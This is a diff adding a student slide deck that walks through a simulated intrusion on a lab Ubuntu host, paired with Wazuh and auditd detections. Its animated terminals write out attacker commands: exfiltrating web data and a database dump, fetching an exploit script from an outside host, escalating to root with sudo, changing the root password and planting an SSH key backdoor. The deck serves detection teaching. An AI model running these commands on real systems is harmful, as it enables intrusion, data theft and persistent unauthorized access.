+          <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl-args.png" alt="curl args" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: curl-args.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">Target</span> — <span class="val">https://copy.fail/exp</span><br>
+          <span class="note">→ Attempted download of a public exploit. The action fails due to Azure network restrictions.</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-11">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — exploit download attempt</span>
+      </div>
+      <div class="term-output" id="term-output-11"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-12">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>21:56:50 → 22:03:58</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 9</span>
+    <span class="step-name">Failed Attempts &amp; SUID Enumeration</span>
+    <span class="step-time">22:03:58</span>
+    <span class="step-mitre">T1078 · T1082 · T1548.001</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc18">
+        <div class="card-label">
+          <span class="card-label-left">Wazuh — su failure: PAM authentication denied</span>
+          <span class="card-label-right">Rules 5503 / 5301</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/su/su-refused.png" alt="su failed" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: su-refused.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">21:56:50</span> — <span class="val">PAM: User login failed</span><br>
+          <span class="note">→ Attacker tries a direct approach with 'su'. Authentication fails.</span>
+        </div>
+      </div>
+      <div class="log-card" id="lc19">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Command execution — /usr/bin/uname</span>
+          <span class="card-label-right">Rule #100001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/uname/uname-r.png" alt="uname command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: uname-r.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">21:57:48</span> — <span class="val">/usr/bin/uname -r</span><br>
+          <span class="note">→ Kernel reconnaissance to identify potential vulnerabilities.</span>
+        </div>
+      </div>
+      <div class="log-card" id="lc20">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Command execution — /usr/bin/find (SUID Search)</span>
+          <span class="card-label-right">Rule #100001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/find/find(loking for suid).png" alt="find command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: find-suid.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">22:03:58</span> — <span class="val">find / -perm -u=s -type f</span><br>
+          <span class="note">→ Searching for SUID binaries that execute with root privileges.</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-12">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — enumeration</span>
+      </div>
+      <div class="term-output" id="term-output-12"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-13">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>22:07:08</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 9</span>
+    <span class="step-name">Successful Privilege Escalation — Sudo Hijacking</span>
+    <span class="step-time">22:07:08</span>
+    <span class="step-mitre">T1548.003 · Sudo</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc21">
+        <div class="card-label">
+          <span class="card-label-left">sudo -l: Discovery of unlimited rights</span>
+          <span class="card-label-right">NOPASSWD: ALL</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/sudo-l/sudo_-l_in_server.png" alt="sudo -l result" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: sudo-l.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="note">→ Critical Discovery: User <span class="val">stt</span> can execute <span class="val">ALL</span> commands as root without a password.</span>
+        </div>
+      </div>
+      <div class="log-card" id="lc22">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Execution of sudo -i — Transition to ROOT</span>
+          <span class="card-label-right">EUID=0 (root)</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/sudo2(-i).png" alt="sudo -i success" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: sudo -i ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">22:07:08</span> — <span class="val">sudo -i</span><br>
+          <span class="note">→ Attacker obtains an interactive root shell. EUID switches to <span class="ok">0</span>.</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-13">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — privilege escalation</span>
+      </div>
+      <div class="term-output" id="term-output-13"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-14">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>22:11:39</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 10</span>
+    <span class="step-name">Root Access Confirmation &amp; Persistence</span>
+    <span class="step-time">22:11:39</span>
+    <span class="step-mitre">T1098 · Account Manipulation</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc23">
+        <div class="card-label">
+          <span class="card-label-left">Wazuh — ROOT access confirmed</span>
+          <span class="card-label-right">Rules 5402 / 5501</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/password change/root gained.png" alt="root gained" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: root-gained.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="note">→ Wazuh generates alerts confirming a successful root session has been opened.</span>
+        </div>
+      </div>
+      <div class="log-card" id="lc24">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Execution of /usr/bin/passwd</span>
+          <span class="card-label-right">Rule 5555</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/password change/passwd.png" alt="password change" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: passwd.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">22:11:39</span> — <span class="val">/usr/bin/passwd</span><br>
+          <span class="note">→ Persistence: Attacker modifies the root password to lock out legitimate administrators.</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-14">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">root@target — persistence</span>
+      </div>
+      <div class="term-output" id="term-output-14"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-15">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>22:17:01</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 11</span>
+    <span class="step-name">Permanent Persistence — SSH Key Injection</span>
+    <span class="step-time">22:17:01</span>
+    <span class="step-mitre">T1098.004 · SSH Authorized Keys</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc25">
+        <div class="card-label">
+          <span class="card-label-left">Wazuh FIM — /root/.ssh/authorized_keys modified</span>
+          <span class="card-label-right">Rule 550</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/backdoor/authrized_key_changed.png" alt="key injection" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: authorized_keys modified ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="note">→ Wazuh's FIM detects the injection of the attacker's public key. File size increased significantly.</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-15">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">root@target — ssh key injection</span>
+      </div>
+      <div class="term-output" id="term-output-15"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-16">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>22:17:25 → 22:17:31</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 11</span>
+    <span class="step-name">Backdoor Activation</span>
+    <span class="step-time">22:17:31</span>
+    <span class="step-mitre">T1098.004 · T1547.004</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc26">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Execution of chmod 600</span>
+          <span class="card-label-right">EUID=0</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/chmod-of-authorized-key.png" alt="chmod 600" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: chmod 600 ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="note">→ Securing the backdoor: setting restrictive permissions on <span class="val">authorized_keys</span>.</span>
+        </div>
+      </div>
+      <div class="log-card" id="lc27">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Execution of systemctl restart ssh</span>
+          <span class="card-label-right">EUID=0</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/rstart ssh.png" alt="ssh restart" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: restart ssh ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="note">→ Restarting SSH to activate the backdoor. The attacker now has permanent root access.</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-16">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">root@target — backdoor activation</span>
+      </div>
+      <div class="term-output" id="term-output-16"></div>
+    </div>
+  </div>
+</div>
+<div class="slide" id="slide-17">
+  <div class="stepbar">
+    <span class="step-num">EXPLOIT</span>
+    <span class="step-name">CVE-2022-30333 — UnRAR Path Traversal via Metasploit</span>
+    <span class="step-mitre">CWE-22</span>
+    <span class="step-badge">CVSS 7.5 HIGH</span>
+  </div>
+
+  <div class="cve-body">
+    <div class="cve-headline">CVE-2022-30333</div>
+    <div class="cve-subtitle">UnRAR Path Traversal Attack</div>
+    <div class="cve-rule"></div>
+    <p class="cve-para">
+      For this demonstration, we exploited <span class="hl-red">CVE-2022-30333</span>, a vulnerability in the
+      <span class="hl-cyan">UnRAR</span> utility that allows an attacker to write files outside the intended
+      extraction directory. By crafting a malicious RAR archive and delivering it to a vulnerable target,
+      we were able to gain <span class="hl-red">unauthorized access</span> to the system.
+      The entire attack was carried out using the <span class="hl-green">Metasploit Framework</span>,
+      which provided a ready-made module to automate the exploitation process from generating the
+      payload to establishing a remote session on the victim machine.
+    </p>
+  </div>
+</div>
+
+<div class="slide" id="slide-18">
+  <div class="stepbar">
+    <span class="step-num">FIN</span>
+    <span class="step-name">End of Presentation</span>
+    <span class="step-mitre">Q&amp;A OPEN</span>
+  </div>
+
+  <div class="ty-layout">
+    <div class="ty-center">
+      <div class="ty-h1">THANK<br>YOU</div>
+      <div class="ty-divider">
+        <div class="ty-line"></div>
+        <div class="ty-icon">PRESENTED BY</div>
+        <div class="ty-line"></div>
+      </div>
+      <div class="ty-names">
+        <div class="ty-name">ABDELKHALEK EL IDRISSI</div>
+        <div class="ty-name">EL MOSTAFA BENNASSER</div>
+        <div class="ty-name">ANAS TARYOUS</div>
+      </div>
+    </div>
+
+    <div class="ty-jamal">
+      <div class="ty-jamal-header">
+        <div class="ty-jamal-avatar">🕵️</div>
+        <div>
+          <div class="ty-jamal-name">JAMAL</div>
+          <div class="ty-jamal-role">// threat_actor :: external_attacker</div>
+        </div>
+      </div>
+      <div class="ty-jamal-term">
+        <div class="term-bar">
+          <div class="term-dot" style="background:#ff3c5a"></div>
+          <div class="term-dot" style="background:#ffd700"></div>
+          <div class="term-dot" style="background:#00e68a"></div>
+          <span style="margin-left:10px">JAMAL@arch-linux</span>
+        </div>
+        <div class="term-body-scroll" id="term-output-18">
+          </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="slide-nav" id="nav"></div>
+<div class="slide-counter" id="counter">1 / 19</div>
+
+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+  <img id="lightbox-img" src="" alt="Zoomed view">
+</div>
+<script>
+/* ═══════════════════════════════════════════════════════
+   GLOBAL STATE & CONFIGURATION
+   ═══════════════════════════════════════════════════════ */
+const TOTAL_SLIDES = 19;
+let currentSlide = 0;
+
+// Terminal Command Sequences for each slide
+const TERMINAL_COMMANDS = {
+  2: [ // Jamal Intro
+    { text: "echo \"hello drari i'm Jamal, and today i will play the role of the attacker haha (for learning purpose only 😅)\"", type: true }
+  ],
+  3: [ // unrar
+    { text: "unrar x /tmp/uploads/backup_data.rar /tmp/processed/", type: true },
+    { text: "Extracting from /tmp/uploads/backup_data.rar...", type: false },
+    { text: "Extracting  /tmp/processed/7f74a8fe-f62b-484/index.php   OK", type: false },
+    { text: "All OK", type: false }
+  ],
+  4: [ // SSH Initial Access
+    { text: "ssh stt@10.0.0.5", type: true },
+    { text: "stt@10.0.0.5's password: ************", type: false },
+    { text: "Welcome to Ubuntu 22.04.4 LTS...", type: false },
+    { text: "stt@ubuntu-target:~$ ", type: false }
+  ],
+  6: [ // Reconnaissance
+    { text: "id", type: true },
+    { text: "uid=1000(stt) gid=1000(stt) groups=1000(stt),27(sudo)", type: false },
+    { text: "ls -R /var/www/html", type: true },
+    { text: "grep -r 'Flask' /opt/apps/", type: true }
+  ],
+  7: [ // Archiving
+    { text: "tar -czf /home/stt/everything.tar.gz /var/www/html/uploads", type: true },
+    { text: "tar: Removing leading '/' from member names", type: false }
+  ],
+  8: [ // SFTP
+    { text: "sftp stt@10.0.0.5", type: true },
+    { text: "Connected to 10.0.0.5.", type: false },
+    { text: "sftp> get everything.tar.gz", type: true },
+    { text: "Fetching /home/stt/everything.tar.gz to everything.tar.gz", type: false }
+  ],
+  9: [ // Credential Theft
+    { text: "vim app.py", type: true },
+    { text: "[Reading app.py source code...]", type: false },
+    { text: "FOUND: db_pass = 'password123'", type: false }
+  ],
+  10: [ // DB Exfil
+    { text: "mysqldump -u root -p password123 zipvault > backup.sql", type: true },
+    { text: "-- Dump completed on 2025-05-31 21:50:33", type: false }
+  ],
+  11: [ // Exploit Download
+    { text: "curl https://copy.fail/exp -o exploit.sh", type: true },
+    { text: "curl: (7) Failed to connect to copy.fail port 443: Connection refused", type: false }
+  ],
+  12: [ // Enumeration
+    { text: "su root", type: true },
+    { text: "Password: ", type: false },
+    { text: "su: Authentication failure", type: false },
+    { text: "find / -perm -u=s -type f 2>/dev/null", type: true }
+  ],
+  13: [ // Sudo Escalation
+    { text: "sudo -l", type: true },
+    { text: "User stt may run the following commands on target:\n (ALL : ALL) NOPASSWD: ALL", type: false },
+    { text: "sudo -i", type: true },
+    { text: "root@target:~# id", type: true },
+    { text: "uid=0(root) gid=0(root) groups=0(root)", type: false }
+  ],
+  14: [ // Persistence
+    { text: "passwd root", type: true },
+    { text: "New password: ", type: false },
+    { text: "Retype new password: ", type: false },
+    { text: "passwd: password updated successfully", type: false }
+  ],
+  15: [ // SSH Key
+    { text: "echo 'ssh-rsa AAAAB3Nza... jamal@attacker' >> /root/.ssh/authorized_keys", type: true }
+  ],
+  16: [ // Backdoor Finalize
+    { text: "chmod 600 /root/.ssh/authorized_keys", type: true },
+    { text: "systemctl restart ssh", type: true }
+  ],
+  18: [ // Jamal Conclusion
+    { text: "echo \"thank you drari!\"", type: true },
+    { text: "echo \"it was a pleasure playing the attacker, hope you learned something new today 😄\"", type: true }
+  ]
+};
+
+/* ═══════════════════════════════════════════════════════
+   TERMINAL ENGINE
+   ═══════════════════════════════════════════════════════ */
+async function typeCommand(el, text, speed = 40) {
+  for (let i = 0; i < text.length; i++) {
+    el.innerHTML += text[i];
+    await new Promise(r => setTimeout(r, speed));
+  }
+  el.innerHTML += "<br>";
+}
+
+async function runTerminal(slideIdx) {
+  const container = document.getElementById(`term-output-${slideIdx}`);
+  if (!container || !TERMINAL_COMMANDS[slideIdx]) return;
+  
+  container.innerHTML = ""; // Clear
+  const commands = TERMINAL_COMMANDS[slideIdx];
+
+  for (const cmd of commands) {
+    const line = document.createElement("div");
+    container.appendChild(line);
+    
+    if (cmd.type) {
+      const prompt = document.createElement("span");
+      prompt.className = "tp";
+      prompt.innerText = "jamal@arch:~# "; // Default prompt
+      line.appendChild(prompt);
+      
+      const cmdText = document.createElement("span");
+      cmdText.className = "tc";
+      line.appendChild(cmdText);
+      await typeCommand(cmdText, cmd.text);
+    } else {
+      line.className = "tdim";
+      line.innerHTML = cmd.text + "<br>";
+    }
+    await new Promise(r => setTimeout(r, 400));
+  }
+  
+  // Add cursor at end
+  const cursor = document.createElement("span");
+  cursor.className = "cursor";
+  container.appendChild(cursor);
+}
+
+/* ═══════════════════════════════════════════════════════
+   ANIMATION & NAVIGATION
+   ═══════════════════════════════════════════════════════ */
+function animCards(ids, delay = 150, step = 320) {
+  ids.forEach((id, i) => {
+    setTimeout(() => {
+      const el = document.getElementById(id);
+      if (el) el.classList.add('shown');
+    }, delay + i * step);
+  });
+}
+
+function runSlideAnimations(n) {
+  // Reset all cards first
+  document.querySelectorAll('.log-card').forEach(c => c.classList.remove('shown'));
+
+  switch(n) {
+    case 3: animCards(['lc0', 'lc1']); break;
+    case 4: animCards(['ssh_lc1', 'ssh_lc0']); break;
+    case 5: animCards(['ssh_conx']); break;
+    case 6: animCards(['card3_0', 'card3_1', 'card3_3']); break;
+    case 7: animCards(['lc7_0', 'lc7_1']); break;
+    case 8: animCards(['lc8_0']); break;
+    case 9: animCards(['lc9_0', 'lc9_1']); break;
+    case 10: animCards(['lc10_0']); break;
+    case 11: animCards(['lc16', 'lc17']); break;
+    case 12: animCards(['lc18', 'lc19', 'lc20']); break;
+    case 13: animCards(['lc21', 'lc22']); break;
+    case 14: animCards(['lc23', 'lc24']); break;
+    case 15: animCards(['lc25']); break;
+    case 16: animCards(['lc26', 'lc27']); break;
+  }
+
+  // Trigger Terminal if exists
+  if (TERMINAL_COMMANDS[n]) {
+    setTimeout(() => runTerminal(n), 800);
+  }
+}
+
+function goTo(n) {
+  if (n < 0 || n >= TOTAL_SLIDES) return;
+
+  // Hide all
+  document.querySelectorAll('.slide').forEach(s => {
+    s.style.display = 'none';
+    s.classList.remove('active', 'visible');
+  });
+
+  // Update dots
+  document.querySelectorAll('.dot').forEach((d, i) => d.classList.toggle('active', i === n));
+  
+  // Show target
+  const sl = document.getElementById(`slide-${n}`);
+  if (sl) {
+    sl.style.display = 'flex';
+    sl.classList.add('active');
+    requestAnimationFrame(() => {
+      sl.classList.add('visible');
+      runSlideAnimations(n);
+    });
+  }
+
+  currentSlide = n;
+  document.getElementById('counter').innerText = `${n + 1} / ${TOTAL_SLIDES}`;
+}
+
+function buildNav() {
+  const nav = document.getElementById('nav');
+  nav.innerHTML = "";
+  for (let i = 0; i < TOTAL_SLIDES; i++) {
+    const d = document.createElement('div');
+    d.className = 'dot' + (i === 0 ? ' active' : '');
+    d.onclick = () => goTo(i);
+    nav.appendChild(d);
+  }
+}
+
+/* ═══════════════════════════════════════════════════════
+   LIGHTBOX & EVENTS
+   ═══════════════════════════════════════════════════════ */
+function openLightbox(src) {
+  const lb = document.getElementById('lightbox');
+  const img = document.getElementById('lightbox-img');
+  img.src = src;
+  lb.classList.add('open');
+}
+
+function closeLightbox() {
+  document.getElementById('lightbox').classList.remove('open');
+}
+
+document.addEventListener('keydown', e => {
+  if (document.getElementById('lightbox').classList.contains('open')) {
+    if (e.key === 'Escape') closeLightbox();
+    return;
+  }
+  if (e.key === 'ArrowRight' || e.key === ' ') goTo(currentSlide + 1);
+  if (e.key === 'ArrowLeft') goTo(currentSlide - 1);
+});
+
+// Initialization
+window.onload = () => {
+  buildNav();
+  goTo(0);
+};
+</script>
